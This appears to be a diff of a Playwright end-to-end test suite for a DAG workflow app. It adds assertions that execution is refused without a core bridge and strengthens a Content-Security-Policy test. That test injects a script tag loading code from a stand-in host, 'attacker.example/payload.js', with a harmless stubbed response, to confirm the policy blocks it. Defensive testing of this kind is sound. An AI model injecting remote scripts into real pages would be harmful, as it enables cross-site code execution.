@@ -6,9 +6,9 @@
  *   2. Login as PM user
  *   3. Dashboard overview
  *   4. Create a DAG (Fleet → DagBuilder)
- *   5. Run the DAG
- *   6. Check run results
- *   7. Give thumbs feedback
+ *   5. Activate the DAG
+ *   6. Verify this no-bridge harness refuses Graph execution
+ *   7. Verify an unadmitted DAG cannot receive Run feedback
  *   8. Visit Optimization Inbox
  *   9. Accept/reject a proposal
  *  10. Verify audit trail
@@ -98,10 +98,15 @@ test.describe("PM Workflow — Full UI Walkthrough", () => {
     expect(dag.nodes.length).toBe(2);
   });
 
-  test("06 — PM can activate and run a DAG", async ({ page }) => {
+  test("06 — PM can activate a DAG but cannot execute without the canonical spine", async ({ page }) => {
     await loginAsPM(page);
     await elevateDagWrites(page, "e2e-run-dag");
     const workspaceId = await createWorkspace(page, "E2E Run Test Workspace");
+    // docker-compose.test.yml intentionally configures no core bridge or
+    // gateway. Activation is definition state, not execution authority (#1113).
+    const health = await page.request.get("/health");
+    expect(health.status()).toBe(200);
+    expect((await health.json()).engine.graph_execution_available).toBe(false);
 
     const createResp = await page.request.post("/v1/dags", {
       data: { name: "E2E Run Test", description: "test" },
@@ -119,10 +124,13 @@ test.describe("PM Workflow — Full UI Walkthrough", () => {
     });
     expect(runResp.status()).toBe(200);
     const run = await runResp.json();
-    expect(run.execution_id).toBeTruthy();
+    expect(run).toEqual({
+      status: "failed",
+      error: "CanonicalGraphUnavailable: execution failed; see server logs",
+    });
   });
 
-  test("07 — PM can give thumbs feedback on a run", async ({ page }) => {
+  test("07 — an unadmitted DAG creates no Run and cannot receive Run feedback", async ({ page }) => {
     await loginAsPM(page);
     await elevateDagWrites(page, "e2e-feedback-dag");
     const workspaceId = await createWorkspace(page, "E2E Feedback Test Workspace");
@@ -140,12 +148,24 @@ test.describe("PM Workflow — Full UI Walkthrough", () => {
     });
     expect(runResp.status()).toBe(200);
     const run = await runResp.json();
-    expect(run.execution_id).toBeTruthy();
-
-    const fbResp = await page.request.post(`/v1/dag-runs/${run.execution_id}/feedback`, {
-      data: { thumb: "up", comment: "Nailed it!", dag_id: dag.id },
+    expect(run).toEqual({
+      status: "failed",
+      error: "CanonicalGraphUnavailable: execution failed; see server logs",
     });
-    expect([200, 404]).toContain(fbResp.status());
+
+    const runsResp = await page.request.get("/v1/dag-runs");
+    expect(runsResp.status()).toBe(200);
+    const runs = await runsResp.json();
+    expect(runs.filter((candidate: { dag_id: string }) => candidate.dag_id === dag.id)).toEqual([]);
+
+    // A real DAG definition ID is not a Run ID. Refusal must not invent a Run
+    // to satisfy the feedback route. Positive feedback on a completed canonical
+    // Graph is proved by test_feedback_route_records_thumb_for_a_completed_canonical_graph_run.
+    const fbResp = await page.request.post(`/v1/dag-runs/${dag.id}/feedback`, {
+      data: { thumb: "up", comment: "No admitted Run", dag_id: dag.id },
+    });
+    expect(fbResp.status()).toBe(404);
+    expect(await fbResp.json()).toEqual({ detail: "run not found" });
   });
 
   test("08 — PM can trigger optimizer and see proposals", async ({ page }) => {
@@ -547,27 +567,59 @@ test.describe("PM Workflow — Full UI Walkthrough", () => {
     // not.
     await page.goto("/");
 
-    const refusals: string[] = [];
-    page.on("console", (message) => {
-      if (/Refused to load the script/i.test(message.text())) {
-        refusals.push(message.text());
-      }
-    });
-
-    await page.evaluate(async () => {
-      await new Promise<void>((resolve) => {
-        const script = document.createElement("script");
-        script.src = "https://attacker.example/payload.js";
-        script.onload = () => resolve();
-        script.onerror = () => resolve();
-        document.body.appendChild(script);
-        setTimeout(resolve, 3000);
+    const attackUrl = "https://attacker.example/payload.js";
+    let networkAttempts = 0;
+    // If CSP is absent, fulfill the attack locally so DNS failure cannot make
+    // the no-execution check pass accidentally. CSP must stop it before routing.
+    await page.route(attackUrl, async (route) => {
+      networkAttempts += 1;
+      await route.fulfill({
+        contentType: "application/javascript",
+        body: "window.__csp_external_probe__ = true;",
       });
     });
 
+    const refusal = await page.evaluate(async (url) => {
+      const state = window as unknown as Record<string, unknown>;
+      state.__csp_external_probe__ = false;
+      return await new Promise<{
+        blockedURI: string;
+        effectiveDirective: string;
+        disposition: string;
+      }>((resolve, reject) => {
+        const timeout = setTimeout(() => {
+          document.removeEventListener("securitypolicyviolation", onViolation);
+          reject(new Error("No CSP violation event for the cross-origin script"));
+        }, 3000);
+        function onViolation(event: SecurityPolicyViolationEvent) {
+          // Browsers may strip the path from a cross-origin blocked URI.
+          if (event.blockedURI !== new URL(url).origin && event.blockedURI !== url) return;
+          clearTimeout(timeout);
+          document.removeEventListener("securitypolicyviolation", onViolation);
+          resolve({
+            blockedURI: event.blockedURI,
+            effectiveDirective: event.effectiveDirective,
+            disposition: event.disposition,
+          });
+        }
+        document.addEventListener("securitypolicyviolation", onViolation);
+        const script = document.createElement("script");
+        script.src = url;
+        document.body.appendChild(script);
+      });
+    }, attackUrl);
+
+    // Structured browser evidence survives console wording changes. A
+    // report-only policy is not enforcement and must fail this assertion.
+    expect(new URL(refusal.blockedURI).origin).toBe(new URL(attackUrl).origin);
+    expect(refusal.effectiveDirective).toBe("script-src-elem");
+    expect(refusal.disposition).toBe("enforce");
+    expect(networkAttempts, "the blocked script reached the network route").toBe(0);
     expect(
-      refusals.join("\n"),
-      "no CSP refusal for a cross-origin script — the policy is not being enforced",
-    ).toContain("attacker.example");
+      await page.evaluate(() =>
+        (window as unknown as Record<string, unknown>).__csp_external_probe__,
+      ),
+      "a cross-origin script ran despite script-src 'self'",
+    ).toBe(false);
   });
 });
